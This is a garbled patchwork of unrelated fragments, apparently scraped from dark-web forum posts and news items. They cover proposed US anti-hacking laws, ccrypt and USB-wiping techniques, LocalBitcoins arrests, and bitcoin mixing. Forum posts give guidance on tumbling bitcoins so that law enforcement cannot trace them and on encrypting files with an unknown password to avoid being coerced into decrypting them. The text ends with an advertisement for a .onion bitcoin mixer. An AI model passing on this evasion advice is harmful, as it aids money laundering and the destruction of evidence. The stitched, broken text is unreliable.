Any party who âknowingly and willfullyâ sent a âpassword or similar information, or any other means of accessâ to a computer, âknowing or having reason to know that a protected computer would be accessed or damaged without authorizationâ would have committed an illegal act, under Obamaâs proposals.Another of Obamaâs recommendations could see offenses covered by the CFAA included in prosecutions under the Racketeering Influenced and Corrupt Organizations Act. According to Graham, just being linked to a hacker group would land you in danger of a 20-year prison sentence. As many innocent researchers and interested parties hang around in the same chatrooms and forums as criminal hackers, this could again ensnare many who donât deserve to have their online activities criminalised.;Under the changes Obama proposed, simply posting, retweeting or clicking on a link you know to contain certain information would be a felony bringing up to 10 years in prison. The government would no longer need to prove you were accessing the information with intent to defraud. It would simply have to show that you were trafficking a link containing passwords or other means of access and had reason to believe such information might be abused. That means that prosecutors could charge you for sharing your Netflix password with a friend if they were so inclined.;In fact, in the words of Errata Securityâs Robert Graham, the Presidentâs proposal is a flat out âwar on hackers.â [Example tweet with link to leaked information]Could you resist the temptation to click on such links? He added that the proposed laws against hacking:""could make either retweeting or clicking on the above (fictional) link illegal. The new laws make it a felony to intentionally access unauthorized information even if it's been posted to a public website. The new laws make it a felony to traffic in information like passwords, where ""trafficking"" includes posting a link.""Not planning to hack anyone? Well Graham says you could âstill be guilty if you hang around with people who do.â He explained:""Obama proposes upgrading hacking to a âracketeeringâ offense, means you can be guilty of being a hacker by simply acting like a hacker (without otherwise committing a specific crime). Hanging out in an IRC chat room giving advice to people now makes you a member of a âcriminal enterprise,â allowing the FBI to sweep in and confiscate all your assets without charging you with a crime."""

With ccrypt, you have to specify whether to encrypt or decrypt from the command line, e.g.: ccrypt -e to encrypt or ccrypt -d to decrypt. ;As an aside, you can also use the -b (or brave) option to just type in a passphrase once -- if you use the command: ccrypt -b -e *.txt you can type randomly on the keyboard so the files will be encrypted with a random password that you do not know. This is a very useful technique to use to scramble data prior to wiping. Once encrypted, you cannot decrypt the files, as you do not know the password used to encrypt them, so you cannot be coerced to decrypt the files. ;for file in `ls -1 -R someDir`do     hash=`md5deep $file `     ccrypt -K ""$hash"" -b -e $filedone"

This has the advantage of being easy to work with -- it looks and feels just like a native volume.  There are a few contenders that have both *nix and windows compatabality in this domain. The two ones that come to mind are truecrypt and LUKS/dmcrypt there are others as well ( https://en.wikipedia.org/wiki/Comparison_of_disk_encryption_software ), but I don't think nearly as much effort has been put into the review of those.",""

With ccrypt, you have to specify whether to encrypt or decrypt from the command line, e.g.: ccrypt -e to encrypt or ccrypt -d to decrypt.   As an aside, you can also use the -b (or brave) option to just type in a passphrase  once -- if you use the command: ccrypt -b -e *.txt you can type randomly on the keyboard so the files will be encrypted with a random password that you do not know. This is a very useful technique to use to scramble data prior to wiping. Once encrypted, you cannot decrypt the files, as you do not know the password used to encrypt them, so you cannot be coerced to decrypt the files.

"The Hub Forums","playground","2978.0","2014-05-02T00:13:19","usb encryption facility that is portable between windows and linux","General Discussion/Security"," Hi Owock,  +1  Thanks for posting the Wei.pdf article. :-) You've lead me on a very productive path.  From what i can gather there is _no_way_ to  wipe, or shred,  a _single_ file held on a usb flash drive.   The original 'deleted' file remains on the medium.   You can't see it because it's not listed, but it remains in situ and unless the usb drive is very full, probably _in_tact_ too.  There are lots of tools out there that take advantage  of this fact by allowing you to recover 'deleted' files  from flash drives.  eg, here are two (free) ones that i tried:  1. recuva from:   http://www.piriform.com/recuva  2. 4CardRecovery from: http://blog4mark.blogspot.ch/2012/12/deleted-files-recovery.html  recuva is okay.  It has a nice interface... but it only seems  to show you recently created/deleted files.  4CardRecovery is really excellent, much better than recuva.   It performs a seemingly exhaustive scan.  What did i do ? I have a usb key that I been preparing to receive gpg4usb.  Some days ago i emptied the usb key by copying it's  content to another drive and deleting each file... i then 'cleaned' the usb by  putting two partitions on it and formatting them individually. One with FAT32, the other with EXT2.  When i ran 4CardRecovery on the ostensibly 'clean' FAT32 partition i was shocked by the number of files, of all types, that it  found there.  There were mp4 and mp3 files.  The videos played perfectly, as did the mp3 files i tested.. completely uncorrupted. Some of those files must have been there for over 12 months.   They have survived deletion and disc partitioning and disc formatting.  I also found decrypted and raw messages that i recently deleted after testing the command line gpg.exe app. that ships with gpg4usb.  Having played with the 4CardRecovery program, it's crystal clear to me now that files are not actually 'deleted' from a USB key,  they're simply removed from the directory listing... nothing more.  Presumably, when LEO confiscates your phone/laptop/computer/usb key and inspects the media for evidence, they use some program like 4CardRecovery to see a history of virtually everything you have been doing.   I did some further tests by encrypting and compressing my gpg4usb and 'secret' encryption messages using 7zip... and deleting the originals. Now you might imagine this process of compressing and encrypting your secret messages would be a nice stealthy way of hiding any  incriminating evidence. ... err.. no.  The original secret messages are still there, in their pristine encrypted and  decrypted formats.   When you create the 7z file, you simply add a new file to the total files held on the medium... nothing is erased. Every time you use your usb key, you're simply accumulating a history of your activities on the usb drive.  This is important, because several usb keys ship within encryption software, the so-called 'encryption vaults'.  You're invited to believe that storing files in this vault will keep them safe from prying eyes. Complete bullshine! .. as my father would say.  If you store a file on your USB drive, and then run the 'encryption vault' the software will encrypt it and delete the original, that's true. But the original isn't deleted.  It's effectively doing the same thing that i did with my 7zip encryption and compression experiment mentioned above.  Presumably it is in recognition of this that some prefer to use whole drive encryption.  However, even here, on a usb stick, a steady history of your activities accumulates on the usb drive.  If you decrypt the disk, you will presumably find data images of all the files you've previously  deleted (just as occurs in the unencrypted usb drive scenario).  The only apparent solution to this 'history of activity' problem seems to  be to sanitize the entire usb drive.  But that seems a little excessive.  I suppose the simplest solution would be to never use the usb drive  for message storage.  Use it only for application execution. Perhaps you could set the permissions on the usb drive to  read and execute (but not write) everywhere, except the directory in which your pubring, secring & gpg.conf files reside.  So you run the encryption software off the usb drive. but you keep the encryption messages on the host machine. when you're done, you encrypt up all the data you want to take with you and copy it to the usb drive (same folder as pubring/secring/gpg.conf).   You then should use something like wipe or shred on the files you want  to delete in your working directory on the host machine.  The big lesson for me from all this is to no longer rely on ""rm -rf file.txt""  or ""del file.txt"" commands to delete files (whether on regular magnetic discs or on usb drives). I now understand the need to shred/wipe/sdelete them. Perhaps aliasing the 'rm' command would be a good idea.  I've just been reading that on windows you can use sdelete  (which comes with the sys-internals package) If anyone knows of other good windows utilities ... feel free to mention it :-)  have a nice day ....  and be happy.  playground. :-)  Thanks again Owock :-)     ","On flash-based memory, either you have to hope the controller supports the ATA secure erase command correctly (most do not), or you have to blank the entire thing with 0s. You can't run 'shred' or anything like that on a flash system. This paper may prove interesting and speaks more to the subject:https://www.usenix.org/legacy/events/fast11/tech/full_papers/Wei.pdfThis is why I would either encrypt the entire partition with the info because 'encrypted data should look just like normal random data', or use a program to encrypt it all before it's on disk. If you really need to work on a document temporarily, you want to mount a partition on a loopback device in memory."

It is well established legally that gifts cannot be taken back. You have absolutely zero legal right to them, regardless of whose credit card they can be traced to. As for ethically, I guess everyone has their own answer, but I think once given away, you lose any claim to an item. So I guess I disagree that you didn't touch anything of hers... you just didn't touch anything that you didn't buy her. Not the same. And you know it is wrong because you said so... I think you're just rationalizing with this and you're definitely still culpable. If she hasn't pursued it legally by now, she won't, so no need to worry there, but I wouldn't try to justify your behavior. Just learn from it and move on.","Yea, what I did here was bad, really bad.  No denying that.  Time has passed since this happened, not past the statute of limitations, but clearly enough time that I feel more comfortable talking about it.  If I had been paying rent, and I bought all of those posessions, I made sure not to touch anything that was actually hers, does that still make me culpable?

Paranoid, maybe. Good question about LE determining who you are. I'll label this as (b).  (a) How do I recieve bitcoins from localbitcoin?  Bitcoin is meant to be an online currency as anonymous as cash. When you pay for something at a store you take money from your wallet. This is what bitcoin is like. You have bitcoins in a bitcoin wallet and you can make transactions. So all of your bitcoins you get from localbitcoins are stored on a wallet. There is a certain bitcoin address you are given it is a string of letters and numbers, this is used to make transactions. So once you've bought bitcoins you must( as I've said) you must send them to your Tor wallet( artificial of course, you won't actually be using it to make and spend money). Once you have sent your bitcoins to your Tor wallet( I'd suggest making a wallet on Onion Wallet or Hidden Wallet). Follow (b) to countinue.  (b) Won't LE determine who you are?  No, after you send your bitcoins to your Tor bitcoin wallet you have to tumble them. Making it almost impossible to trace where they came from. The entire purpose of tumbling is to frusterate bitcoin strings. After they have been tumbled you must send them to your real Tor bitcoin address. Then your bitcoins are safe and secure.     Selling your bitcoins is quite the reverse in terms of directions. Tumble bitcoins send them to your localbitcoins address then you are able to sell them on localbitcoins.   If you need any help contact me using PGP encryption. If you don't it will give away your and my location. If you have any questions about PGP encryption, make a seperate thread on The Hub.

They were charged under state anti-money-laundering laws following an investigation by the US Secret Service, said reports.Security blogger Brian Krebs reported that Michell Abner Espinoza of Miami Beach was arrested after a sting in which an undercover agent engaged him in a fake transaction to convert $30,000 worth of cash into bitcoins.In addition, 29-year-old Pascal Reid was also arrested after meeting with an undercover agent to exchange $30,000 for bitcoins.The chargesBoth of the men are being charged under two laws. The first is Florida's anti-money laundering law, which targets money exchanges above $10,000.The second is running an unlicensed money transmission business. Statute 560.125 forbids people from exgaging in frequent unlicensed money transmission-type transactions of more than $300 but less than $20,000 in any 12-month period in the state.Depending on the amount involved, it is considered a felony of the third, second, or first-degree. Exchanging more than $100,000 in funds during any 12-month period is considered a first-degree felony. Fines of twice the currency value, up to a value of $250,000, are possible.Espinoza, said to go under the name MichaelHack on LocalBitcoins.com, had trades involving more than 150 bitcoins in the last six months, say reports.Headquartered in Finland, LocalBitcoins.com is a person-to-person trading website, which facilitates trades both online and in person. Unlike exchanges that automatically reconcile trades using an online order book, exchanges like LocalBitcoins.com let users find each other, and handle the trades themselves. The site has been gaining popularity rapidly in recent months, adding roughly 1,000 users each day.LocalBitcoins reactsJeremias Kangas, the owner of LocalBitcoins.com, wasn't aware of the charges when contacted by CoinDesk. He explained that the site relied on users to follow the laws in their own countries when conducting trades. ""Thatâs our guideline. But itâs quite difficult for us to look after everyone,"" he said.Currently, users are expected to verify each other themselves when handling in-person trades, Kangas noted. The company has been working on a central verification system, although that has not yet been implemented.""This is inevitable of course,"" said Kangas of the Florida incident. ""We have to have more scrutiny and tools to watch that everything on our website is legal, and our users can follow their local laws. We are spending a lot of resources on that, but we are a startup.""Localbitcoins.com does not limit the size of trades, admitted Kangas. ""That might be possible, actually. We havenât thought about that,"" he said.Next stepsEspinoza had his bond hearing today, and faces three charges; two related to money laundering amounts under $20,000 and between $20,000 and $100,000.

It was their money, but they couldn't carry more than 10,000 dollars into the country at a time. so they packed it all under my little kid shit. it was impressed upon me really early that owning money was ok but you're not allowed to do just anything you want with it.","Quote from: pallidpallas on May 02, 2015, 03:15:39 amQuote from: libertygangster on May 02, 2015, 01:35:50 amSooo.. lets say I buy bitcoins with cash from ""localbitcoin"" and then what how do I receive them?  AND .. if you were buy said bitcoins by paying cash what would stop LE from setting up a sting to sell you bitcoin, get your plates, determine who you are, then track the flow of the coins??  Am I being stupid?  Paranoid?Importantly, it's completely legal to buy and own Bitcoin. There can't be a ""sting"" selling something that's legal.

Remember the following? QuoteLocalBitcoins.com Users Face Criminal Charges in FloridaDanny Bradbury (@dannybradbury) | Published on February 7, 2014 at 19:02 BSTAt least two men in Florida have been charged for moving large volumes of bitcoins via the popular person-to-person exchange LocalBitcoins.com. They were charged under state anti-money-laundering laws following an investigation by the US Secret Service, said reports.Security blogger Brian Krebs reported that Michell Abner Espinoza of Miami Beach was arrested after a sting in which an undercover agent engaged him in a fake transaction to convert $30,000 worth of cash into bitcoins.In addition, 29-year-old Pascal Reid was also arrested after meeting with an undercover agent to exchange $30,000 for bitcoins.The chargesBoth of the men are being charged under two laws. The first is Florida's anti-money laundering law, which targets money exchanges above $10,000.The second is running an unlicensed money transmission business. Statute 560.125 forbids people from exgaging in frequent unlicensed money transmission-type transactions of more than $300 but less than $20,000 in any 12-month period in the state.Depending on the amount involved, it is considered a felony of the third, second, or first-degree. Exchanging more than $100,000 in funds during any 12-month period is considered a first-degree felony. Fines of twice the currency value, up to a value of $250,000, are possible.Espinoza, said to go under the name MichaelHack on LocalBitcoins.com, had trades involving more than 150 bitcoins in the last six months, say reports.Headquartered in Finland, LocalBitcoins.com is a person-to-person trading website, which facilitates trades both online and in person. Unlike exchanges that automatically reconcile trades using an online order book, exchanges like LocalBitcoins.com let users find each other, and handle the trades themselves. The site has been gaining popularity rapidly in recent months, adding roughly 1,000 users each day.LocalBitcoins reactsJeremias Kangas, the owner of LocalBitcoins.com, wasn't aware of the charges when contacted by CoinDesk. He explained that the site relied on users to follow the laws in their own countries when conducting trades. ""Thatâs our guideline. But itâs quite difficult for us to look after everyone,"" he said.Currently, users are expected to verify each other themselves when handling in-person trades, Kangas noted. The company has been working on a central verification system, although that has not yet been implemented.""This is inevitable of course,"" said Kangas of the Florida incident. ""We have to have more scrutiny and tools to watch that everything on our website is legal, and our users can follow their local laws. We are spending a lot of resources on that, but we are a startup.""Localbitcoins.com does not limit the size of trades, admitted Kangas. ""That might be possible, actually. We havenât thought about that,"" he said.Next stepsEspinoza had his bond hearing today, and faces three charges; two related to money laundering amounts under $20,000 and between $20,000 and $100,000. The third charge relates to money transmission services for amounts between $20,000 and $100,000.Reid's case details were not yet on file at the time of writing, but he is being tried for unlicensed money transmission services on a third degree felony. This underscores the importance of knowing the laws in your particular jurisdiction. Zaphod"

Also had they not tried to move so much at once the FEDs would likely  not have got involved. $30,000 is a lot of money for us peasants to have, we truly are just piss ants to them, and they will bait someone in hopes of following the target to an anthill.

While using bitcoins is an excellent way to make your purchases, donations, and p2p payments, without losing money through inflated transaction fees, transactions are never truly anonymous. Bitcoin activities are recorded and available publicly via the blockchain; a comprehensive database which keeps a record of bitcoin transactions.  All exchanges require the user to scan ID documents, and large transactions must be reported to the proper governmental authority. When you use Bitcoin to pay for goods and services, you will of course need to provide your name and address to the seller for delivery purposes.  This means that a third party with an interest in tracking your activities can use your visible balance and ID information as a basis from which to track your future transactions or to study previous activity. In short, you have compromised your security and privacy.  To avoid this, we recommend using a quality mixing service such as the one we provide to periodically exchange your bitcoins for different ones which cannot be associated with the original owner. In order to further enhance the security of your transactions we provide the opportunity to use two or more forward addresses as well as convenient time delays. In addition, we immediately delete all archival logs related to your transactions.  http://bitmixegkuerln7q.onion/",""
